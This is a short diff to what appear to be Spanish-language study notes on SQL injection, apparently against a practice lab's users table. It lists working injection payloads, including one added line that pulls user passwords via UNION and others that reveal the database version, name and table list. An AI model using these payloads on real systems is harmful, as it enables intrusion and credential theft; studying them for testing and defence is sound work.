@@ -32,6 +32,7 @@ xploits
 1' OR 1=1--' <-- lista todos los usuarios de la BD
 "SELECT first_name, last_name FROM users WHERE user_id = 1' OR 1=1--'"
 más ejemplos
+' UNION select first_name, password from users-- '
 ' union all select 1,@@VERSION-- '  <-- muestra la versión de la base de datos
 ' union all select 1,database()'    <-- muestra el nombre de la base de datos
 %' and 1=0 union select null, table_name from information_schema.tables # <-- muestra las tablas de lA BD
